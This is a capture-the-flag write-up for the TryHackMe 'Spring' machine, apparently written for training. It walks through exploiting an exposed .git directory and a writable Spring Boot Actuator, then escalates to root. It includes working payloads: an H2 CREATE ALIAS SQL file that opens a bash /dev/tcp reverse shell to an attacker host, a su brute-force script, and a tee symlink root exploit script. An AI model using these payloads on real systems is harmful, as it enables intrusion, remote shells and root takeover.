---
title: TryHackMe - Spring
date: 2026-08-06
tags:
  - TryHackMe
  - Spring Boot
  - Actuator RCE
  - Symlink Attack
summary: Exploited an exposed .git directory to recover Spring Boot application source code and credentials, bypassed an IP-restricted Actuator using a custom trust header, chained a fake Spring Cloud Config Server response with an H2 database INIT SQL injection for RCE, brute-forced a reused password pattern via su, and escalated to root through a systemd tee symlink write into /root/.ssh/authorized_keys.
---

# TryHackMe — Spring

**Platform:** TryHackMe
**Machine:** Spring
**OS:** Linux
**Difficulty:** Hard

## Attack Path Summary

```
.git exposure → git-dumper source recovery → custom IP-trust header found
→ Actuator IP-restriction bypass → writable /actuator/env confirmed
→ fake Spring Cloud Config Server + H2 INIT=RUNSCRIPT → RCE as nobody
→ password-pattern brute force via su → johnsmith
→ systemd root service + tee symlink write → root
```

---

## 1. Reconnaissance

### 1.1 Web Enumeration

Initial directory brute forcing against the HTTPS application surface turned up a static file path:

```bash
gobuster dir -u https://spring.thm -w /usr/share/wordlists/dirb/common.txt -k
```

Result of interest:

```
/sources  (Status: 302) [--> /sources/]
```

A second round of fuzzing specifically under `/sources/` revealed a subdirectory:

```
/sources/new/
```

### 1.2 Fuzzing Under /sources/new/

With `/sources/new/` confirmed as the only meaningful path, files and directories were enumerated beneath it:

```bash
ffuf -k \
  -u https://spring.thm/sources/new/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -mc all -fc 404
```

Notable hits:

```
.gitignore   [Status: 200]
.git         [Status: 302]
```

A `.gitignore` file directly reachable, plus a `.git` path redirecting, strongly suggested the `.git` metadata directory had been deployed alongside the static content.

---

## 2. Source Code Recovery

### 2.1 Confirming Git Exposure

```bash
curl -k -i https://spring.thm/sources/new/.git
curl -k -i https://spring.thm/sources/new/.git/
curl -k -i https://spring.thm/sources/new/.git/HEAD
```

`.git/HEAD` returned:

```
ref: refs/heads/master
```

confirming a live, reachable Git repository.

### 2.2 Dumping the Repository

```bash
git-dumper https://spring.thm/sources/new/.git dumped_repo
```

Recovered project structure:

```
dumped_repo/
├── build.gradle
├── gradle/wrapper/gradle-wrapper.properties
├── gradlew
├── gradlew.bat
├── settings.gradle
└── src/main/
    ├── java/com/onurshin/spring/Application.java
    ├── resources/application.properties
    └── resources/dummycert.p12
```

### 2.3 Credential and Configuration Extraction

`application.properties` contained the full runtime configuration in plaintext:

```properties
server.port=443
server.ssl.key-store=classpath:dummycert.p12
server.ssl.key-store-password=DummyKeystorePassword123.
server.ssl.keyStoreType=PKCS12
management.endpoints.enabled-by-default=true
management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart
management.endpoint.env.keys-to-sanitize=
server.forward-headers-strategy=native
server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04
spring.security.user.name=johnsmith
spring.security.user.password=PrettyS3cureSpringPassword123.
spring.cloud.config.uri=
spring.cloud.config.allow-override=true
```

Key findings:

- **Custom IP trust header:** `x-9ad42dea0356cb04` replaces the conventional `X-Forwarded-For` for Tomcat's `remoteip` valve, and `forward-headers-strategy=native` means Tomcat will trust whatever IP this header claims.
- **Blank `keys-to-sanitize`:** disables Spring Boot's default secret-masking on `/actuator/env`, so all values return in plaintext instead of `******`.
- **Injectable Config URI:** `spring.cloud.config.uri` is empty and `allow-override=true`, meaning it can be set at runtime via the writable Actuator env endpoint.
- **Dummy cert:** `dummycert.p12` in the repo is a decoy — the real certificate is loaded separately via command-line arguments at startup (confirmed later via `/actuator/env`).

`Application.java` confirmed the Actuator IP restriction:

```java
.antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")
```

This restriction is only meaningful if the client's real IP can't be spoofed — but since Tomcat trusts the custom header for IP resolution, any request supplying `x-9ad42dea0356cb04: <IP in 172.16.0.0/24>` bypasses it entirely.

---

## 3. Actuator IP Bypass and Reconnaissance

### 3.1 Confirming the Bypass

```bash
curl -k -H "x-9ad42dea0356cb04: 172.16.0.10" https://spring.thm/actuator/env
```

This returned the full runtime environment — confirming the header-based bypass worked.

### 3.2 Enumerating Exposed Endpoints

```bash
curl -k -H "x-9ad42dea0356cb04: 172.16.0.10" https://spring.thm/actuator/mappings
```

Confirmed the following were writable/available:

```
POST   /actuator/env       ← inject runtime properties
POST   /actuator/restart   ← restart application context (same JVM)
POST   /actuator/shutdown  ← terminate JVM entirely (systemd relaunches it)
```

### 3.3 Connectivity Probe

To confirm outbound connectivity from the target, a fake config URI was injected and the app restarted while a listener was running locally:

```bash
curl -k -X POST \
  -H "Content-Type: application/json" \
  -H "x-9ad42dea0356cb04: 172.16.0.10" \
  -d '{"name":"spring.cloud.config.uri","value":"http://<ATTACKER_IP>:8888"}' \
  https://spring.thm/actuator/env

curl -k -X POST \
  -H "x-9ad42dea0356cb04: 172.16.0.10" \
  https://spring.thm/actuator/restart
```

```bash
python3 -m http.server 8888
```

Listener output confirmed the client fetch pattern:

```
GET /application/default HTTP/1.1
200
```

This matches the Spring Cloud Config client's standard request shape: `/<app-name>/<profile>`.

---

## 4. Initial Access — Fake Config Server + H2 INIT SQL Injection

### 4.1 Exploit Theory

The application uses an in-memory H2 database. H2 supports an `INIT` connection parameter that runs a SQL script at connection time. Combined with H2's `CREATE ALIAS` feature — which compiles inline Java as a callable SQL procedure — this becomes a code execution primitive once an attacker controls the JDBC URL.

The chain:

1. Inject `spring.cloud.config.uri` pointing at an attacker-controlled HTTP server.
2. That server returns a Spring Cloud Config JSON response containing a malicious `spring.datasource.url`.
3. The malicious URL's `INIT=RUNSCRIPT FROM '<url>'` parameter pulls a second attacker-hosted SQL file.
4. That SQL file defines a `CREATE ALIAS` Java method wrapping `Runtime.exec()`, then calls it with a reverse shell command.
5. Restarting/reconnecting the datasource triggers the SQL script, and the JVM spawns the reverse shell as a subprocess.

### 4.2 Payload Files

Directory setup on attacker machine:

```bash
mkdir ~/spring-rce && cd ~/spring-rce
```

**`application/default`** (Spring Cloud Config response):

```json
{
  "name": "application",
  "profiles": ["default"],
  "label": null,
  "version": null,
  "state": null,
  "propertySources": [
    {
      "name": "malicious",
      "source": {
        "spring.datasource.url": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://<ATTACKER_IP>:8889/exploit.sql'"
      }
    }
  ]
}
```

**`exploit.sql`:**

```sql
CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String cmd) throws Exception {
    Runtime rt = Runtime.getRuntime();
    String[] commands = {"/bin/bash", "-c", cmd};
    Process proc = rt.exec(commands);
    return "done";
} $$;
CALL EXEC('bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1');
```

### 4.3 Serving and Triggering

```bash
# Terminal 1 — config server
python3 -m http.server 8888

# Terminal 2 — SQL payload server
python3 -m http.server 8889

# Terminal 3 — reverse shell listener
nc -lvnp 4444
```

Injecting the malicious datasource URL and restarting:

```bash
curl -k -X POST \
  -H "Content-Type: application/json" \
  -H "x-9ad42dea0356cb04: 172.16.0.10" \
  -d '{"name":"spring.datasource.url","value":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '\''http://<ATTACKER_IP>:8889/exploit.sql'\''"}' \
  https://spring.thm/actuator/env

curl -k -X POST \
  -H "x-9ad42dea0356cb04: 172.16.0.10" \
  https://spring.thm/actuator/restart
```

### 4.4 Result

Hit sequence on the attacker machine confirmed the full chain:

```
Port 8888: GET /application/default   ← config fetched
Port 8889: GET /exploit.sql           ← H2 INIT triggered
Port 4444: connection received        ← shell as nobody
```

```
nobody@spring:/$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

The reverse shell was stabilized with a PTY upgrade:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 5. Lateral Movement — Pattern-Based `su` Brute Force

### 5.1 Password Pattern Inference

`ls -la /home` revealed a single user, `johnsmith`, owning `user.txt` (unreadable as `nobody`) and a group-writable `tomcatlogs` directory.

The application config already contained a known password following a clear structure:

```
spring.security.user.password=PrettyS3cureSpringPassword123.
```

Breaking down the format:

- **Prefix:** `PrettyS3cure`
- **Variable word:** `Spring` (capitalized dictionary word)
- **Suffix:** `Password123.`

This single confirmed example was enough to define the OS account password format, on the assumption `johnsmith` reused the same personal pattern for his Linux login.

### 5.2 Wordlist Generation

Capitalized single-case words were extracted from rockyou.txt (left in native frequency order rather than sorted alphabetically, to hit common words first):

```bash
grep -E '^[A-Z][a-z]+$' /usr/share/wordlists/rockyou.txt > pass_freq.txt
```

Each word was expanded into a full candidate password:

```bash
sed 's/.*/PrettyS3cure&Password123./' pass_freq.txt > formatted.txt
```

### 5.3 Wordlist Transfer

```bash
# attacker
python3 -m http.server 9001

# target (as nobody)
wget -q http://<ATTACKER_IP>:9001/formatted.txt -O /tmp/formatted.txt
```

### 5.4 Brute Force Script

`su` requires a TTY and rejects piped input directly, so `script -qc` was used to allocate a pseudo-TTY:

```bash
cat > /tmp/su_bruteforce.sh << 'EOF'
#!/bin/bash
TARGET_USER="johnsmith"
WORDLIST="${1:-/tmp/formatted.txt}"
COUNTER=0
while IFS= read -r password || [[ -n "$password" ]]; do
    [[ -z "$password" ]] && continue
    COUNTER=$((COUNTER + 1))
    output=$(echo "$password" | script -qc "su $TARGET_USER -c 'id'" /dev/null 2>/dev/null)
    if [[ "$output" == *"uid="* ]]; then
        echo "[+] CRACKED! $TARGET_USER:$password"
        echo "$password" > /tmp/found_password.txt
        exit 0
    fi
    (( COUNTER % 50 == 0 )) && echo "[$COUNTER] still trying... ($password)"
done < "$WORDLIST"
EOF

nohup bash /tmp/su_bruteforce.sh /tmp/formatted.txt > /tmp/brute.log 2>&1 &
disown
```

### 5.5 Result

The correct password was located in the wordlist immediately following the `Accounting` entry:

```bash
grep -A1 "AccountingPassword123." /tmp/formatted.txt
```

```
PrettyS3cureAccountsPassword123.
```

Confirmed via direct `su`:

```
johnsmith@spring:~$ su johnsmith
Password: PrettyS3cureAccountsPassword123.
$ id
uid=1000(johnsmith) gid=1000(johnsmith) groups=1000(johnsmith)
```

**User flag:**

```
THM{this_is_still_password_reuse}
```

### 5.6 Stabilizing Access via SSH

To move off the fragile reverse-shell/`su` chain, an SSH keypair was generated and the public key added to `johnsmith`'s `authorized_keys`:

```bash
# attacker
ssh-keygen -t ed25519 -f ~/johnsmith_key -N ""

# target, as johnsmith
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "<attacker public key>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

```bash
ssh -i ~/johnsmith_key johnsmith@spring.thm
```

---

## 6. Privilege Escalation — systemd `tee` Symlink Write to Root

### 6.1 Service Enumeration

```bash
cat /etc/systemd/system/spring.service
```

```ini
[Unit]
Description=Spring Boot Application
After=syslog.target
StartLimitIntervalSec=0
[Service]
User=root
Restart=always
RestartSec=1
ExecStart=/root/start_tomcat.sh
[Install]
WantedBy=multi-user.target
```

`/root/start_tomcat.sh` was not directly readable, but the service pipes its stdout through `tee` into a per-run log file:

```bash
ls -la ~/tomcatlogs
```

```
drwxrwxr-x 2 johnsmith johnsmith 4096 Aug  6 08:17 .
-rw-r--r-- 1 root      root      6928 Jul 10  2020 1594410148.log
-rw-r--r-- 1 root      root      6728 Jul 10  2020 1594410465.log
...
```

Key facts:

- `tee` runs as **root**, writing logs named by **Unix epoch timestamp**.
- The parent directory `tomcatlogs` is **owned and writable by `johnsmith`**.
- `Restart=always` / `RestartSec=1` means the service resurrects itself within one second of being killed, generating a fresh `tee` invocation with a new (predictable) timestamp filename.

Since `johnsmith` owns the directory (not the individual log files), he can pre-place a **symlink** at any future filename before that filename is created — root's `tee` will follow it without validation.

### 6.2 The Write Primitive

The application's Hello World controller (from `Application.java`) writes the `name` request parameter directly to stdout:

```java
public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
    System.out.println(name);
    return String.format("Hello, %s!", name);
}
```

Since `tee` captures the JVM's stdout into the log file, whatever value is sent as `name` gets written wherever the current log symlink points.

`/root/.ssh/authorized_keys` is the ideal target: SSH silently ignores any line it cannot parse as a valid public key, so all the surrounding Spring Boot startup noise is harmless — only a well-formed key line takes effect. `/root/.ssh/` did not yet exist, which is fine: `tee` will create both the directory and file on first write, provided the symlink is already in place.

### 6.3 Exploit Script

```bash
cd ~/tomcatlogs
cat > get_root.sh << 'EOF'
#!/bin/bash
[ -f ./key ] || ssh-keygen -t ed25519 -f ./key -q -N ""
pubkey=$(cat ./key.pub)

echo "[*] Sending shutdown to force fresh tee..."
curl -sk -X POST https://localhost/actuator/shutdown \
  -H 'x-9ad42dea0356cb04: 172.16.0.10' \
  -u johnsmith:PrettyS3cureAccountsPassword123.

echo "[*] Planting symlinks for next 30 seconds of timestamps..."
d=$(date '+%s')
for i in {1..30}; do
    t=$(( d + i ))
    ln -sf /root/.ssh/authorized_keys "${t}.log" 2>/dev/null
done

echo "[*] Waiting for restart..."
sleep 30s

echo "[*] Writing pubkey via Hello World endpoint..."
curl -sk --data-urlencode "name=$pubkey" https://localhost/ \
  -u johnsmith:PrettyS3cureAccountsPassword123.

sleep 5s
echo "[*] Attempting root SSH..."
ssh -o "StrictHostKeyChecking=no" -i ./key root@localhost
EOF
bash get_root.sh
```

**Why `/actuator/shutdown` and not `/actuator/restart`:** `restart` only bounces the Spring application context inside the _same_ JVM process, so `tee` keeps writing to the same file handle and timestamp. `shutdown` kills the entire JVM, forcing systemd to re-execute `start_tomcat.sh` from scratch — producing a brand-new `tee` invocation with a fresh, predictable timestamp that the pre-planted symlinks can intercept.

### 6.4 Result

The service restarted, `tee` followed the symlink into `/root/.ssh/authorized_keys`, the attacker's public key was written via the Hello World endpoint, and root SSH access was established:

```
root@spring:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 7. Flags

| Flag     | Value                               |
| -------- | ----------------------------------- |
| Foothold | `THM{dont_expose_.git_to_internet}` |
| User     | `THM{this_is_still_password_reuse}` |
| Root     | `THM{sshd_does_not_mind_the_junk}`  |

---

## 8. Vulnerability Summary

| #   | Vulnerability                                                     | Severity | Impact                                        |
| --- | ----------------------------------------------------------------- | -------- | --------------------------------------------- |
| 1   | Exposed `.git` directory in web root                              | High     | Full source code and credential disclosure    |
| 2   | Hardcoded credentials in version-controlled config                | High     | Valid authentication against live application |
| 3   | Actuator exposed with IP-bypass via spoofable custom header       | Critical | Full runtime environment read/write access    |
| 4   | Blank `keys-to-sanitize` on `/actuator/env`                       | High     | All secrets exposed in plaintext              |
| 5   | Injectable `spring.cloud.config.uri` + H2 in-memory DB            | Critical | Unauthenticated remote code execution         |
| 6   | Predictable password pattern reused across credentials            | Medium   | Password recovery via targeted brute force    |
| 7   | Root-owned process (`tee`) writing into a user-writable directory | High     | Arbitrary file write as root via symlink      |

---

PWN by **W4RR1OR**
